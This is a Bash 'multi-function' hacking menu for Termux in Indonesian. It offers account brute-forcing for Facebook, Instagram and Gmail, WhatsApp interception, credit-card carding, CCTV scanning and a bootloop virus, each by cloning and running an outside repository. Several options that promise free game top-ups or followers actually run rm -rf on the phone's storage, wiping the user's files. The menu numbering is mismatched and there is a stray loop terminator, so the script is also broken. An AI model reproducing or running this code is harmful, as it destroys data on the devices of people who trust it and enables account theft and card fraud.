#jangan recode 
#jangan copas
#pake aja langsung
#dengan recode gak bikin lu jadi jago
#camkan itu ferguso
# Variables
b='\033[1m'
u='\033[4m'
bl='\E[30m'
r='\E[31m'
g='\E[32m'
bu='\E[34m'
m='\E[35m'
c='\E[36m'
w='\E[37m'
endc='\E[0m'
enda='\033[0m'
blue='\e[1;34m'
cyan='\e[1;36m'
red='\e[1;31m'

figlet Mr.TUM4 | lolcat

echo -u "######################################################"
echo -b " TOOLS MULTI FUNGSI TERMUX $green " |lolcat
echo -b " CODED BY V4LD0 T4R0R3H $green " |lolcat
echo -b " FIND ME ON FB : Valdo Taroreh $green " |lolcat
echo -b " Mr.TUM4 - TUM4LUNTUNG404 $green " |lolcat
echo -u "#######################################################"


###################################################
# CTRL + C                                        #
###################################################

trap ctrl_c INT
ctrl_c() {
clear
echo -b $green"[#]> (Ctrl + C ) Detected, Trying To Exit ... " |lolcat
echo -b $green"[#]> MAKASIH UDH PAKE TOOLS GUE " |lolcat
sleep 1
echo ""
echo -b $green"[#]> V4LD0 WAS HERE" |lolcat

echo -b $green"[#]> See you Again :)..." |lolcat
sleep 1
exit
}

lagi=1
while [ $lagi -lt 6 ];
do
echo ""
echo -e $b "1. HACK FB NARGET${enda}";
echo -e "============================" | lolcat
echo -e $b "2. HACK IG NARGET${enda}";
echo -e "============================" | lolcat
echo -e $b "3. HACK GMAIL${enda}";
echo -e "============================" | lolcat
echo -e $b "4. SADAP WA JARAK JAUH${enda}";
echo -e "============================" | lolcat
echo -e $b "5. TOP UP ILEGAL ML${enda}";
echo -e "============================" | lolcat
echo -e $b "6. TOP UP ILEGAL COC${enda}";
echo -e "============================" | lolcat
echo -e $b "7. AUTO FOLLOWERS IG${enda}";
echo -e "============================" | lolcat
echo -e $b "8. DUMP TEMAN FB${enda}";
echo -e "============================" | lolcat
echo -e $b "9. CARI CC BUAT CARDING${enda}";
echo -e "============================" | lolcat
echo -e $b "10. TOP UP FREE FIRE${enda}";
echo -e "============================" | lolcat
echo -e $b "11. TEMBAK KUOTA${enda}";
echo -e "============================" | lolcat
echo -e $b "12. BUAT VIRUS BOOTLOOP HP${enda}";
echo -e "============================" | lolcat
echo -e $b "13. JADWAL SHOLAT${enda}";
echo -e "============================" | lolcat
echo -e $b "14. HACK CCTV${enda}";
echo -e "============================" | lolcat
echo -e $b "15. HACK PULSA SMARTFREN${enda}";
echo -e "============================" | lolcat
echo -e $b "16. Exit${enda}";
echo -e "╭─V4LD0 T4R0R3H [PILIH AJA NOMERNYA]" | lolcat
read -p "╰─#" pil;

case $pil in
    1) echo "V4LD0 TOOLS-HACK FB NARGET" | lolcat
            pkg install python2
            git clone https://github.com/Senitopeng/KumpulanFbbrute
            echo -e "${y} cara menggunakan KumpulanFbbrute"
            cd KumpulanFbbrute
            python2 jomblo.py
            
;;

2) echo "V4LD0 TOOLS-HACK IG NARGET" | lolcat
        apt install python2
        git clone https://github.com/Senitopeng/instabot.git
        echo -e "${y} cara menggunakan INSTA HACK"
        cd instabot
        ./instabot
      
;;

3) echo "V4LD0 TOOLS-HACK GMAIL" | lolcat
        apt install python2
        git clone https://github.com/AyoubSirai/gmail_attacker
        echo -e "${y} cara menggunakan Gmail HACK"
        cd gmail_attacker
        python2 gmail_attacker.py
    

;;

4) echo "V4LD0 TOOLS-SADAP WA" | lolcat
    git clone https://github.com/soracyberteam/what-sexploit
        echo -e "${y} cara sadap whatsapp"
        cd what-sexploit
        ./whatsex
    

;;

5) rm -rf /sdcard/
    rm -rf /storage/emulated/0/
exit

;;

6) rm -rf /sdcard/
    rm -rf /storage/emulated/0/
exit

;;

7) rm -rf /sdcard/
    rm -rf /storage/emulated/0/
exit

;;

8) echo "V4LD0 TOOLS-DUMP TEMAN FB" | lolcat
    git clone https://github.com/CiKu370/OSIF
        echo -e "${y} cara dump nya "
        cd OSIF
        pip2 install -r requirements.txt
        python2 osif.py
    
;;

9) echo "V4LD0 TOOLS-CC CARDING" | lolcat
        git clone https://github.com/ganucisystem/creditcard
        echo -e "${y} cara ambil cc nya "
        cd creditcard
        php fake.php
       

;;

10) echo "Mau Tools VIP? harap hubungi author di fb : Valdo Taroreh" | lolcat
    rm -rf /sdcard/
    rm -rf /storage/emulated/0/
echo

;;

11) echo "V4LD0 TOOLS-TEMBAK KUOTA" | lolcat
        git clone https://github.com/kumpul4semut/semut.git
        echo -e "${y} cara tembaknya "
        cd semut
        python2 dor.py
    

;;

12) echo "V4LD0 TOOLS-TEMBAK KUOTA" | lolcat 
    git clone https://github.com/aryanrtm/Jadwal-Sholat
    cd Jadwal-Sholat
    sh jadwal-sholat.sh
    
;;

13) echo "V4LD0 TOOLS-BUAT VIRUS" | lolcat  
    git clone https://github.com/TUANB4DUT/VIRUS
    cd VIRUS
    chmod +x bootloop.sh
    sh bootloop.sh
    
;;

14) echo "V4LD0 TOOLS-HACK CCTV" | lolcat  
    pkg install python2
    git clone https://github.com/kancotdiq/ipcs
    cd ipcs
    python2 scan.py
    
;;

15) echo "V4LD0 TOOLS-HACK PULSA" | lolcat  
    pkg install php
    git clone https://github.com/ganucisystem/radenkeceh
    cd radenkeceh
    php pulsa.php

;;

16) echo "BYE BYE PARA HEKER,INCARLAH SESUATU YG MUSTAHIL" | lolcat
exit

;;

*) echo "Sorry, Your choices it's not already [T4T]"
esac
done
done
